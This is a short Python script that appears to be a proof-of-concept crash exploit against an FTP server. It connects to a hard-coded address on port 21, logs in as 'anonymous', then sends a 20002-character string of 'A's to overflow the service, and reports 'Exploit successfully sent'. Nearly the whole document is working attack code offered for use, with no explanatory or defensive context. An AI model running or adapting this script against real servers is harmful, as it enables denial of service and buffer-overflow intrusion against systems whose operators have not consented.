
import socket
import sys

USER    = "anonymous"
PASSWD  = "anon"


crash = "A" * 20002

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.120",21))
data = s.recv(1024)

print("[-] Login to FTP Server...\n")
s.send("USER " + USER + '\r\n')
data = s.recv(1024)

s.send("PASS " + PASSWD + '\r\n')
data = s.recv(1024)

print("[-] Sending exploit...\n")
s.send(crash +'\r\n')
s.close()

print("[!] Done! Exploit successfully sent\n")

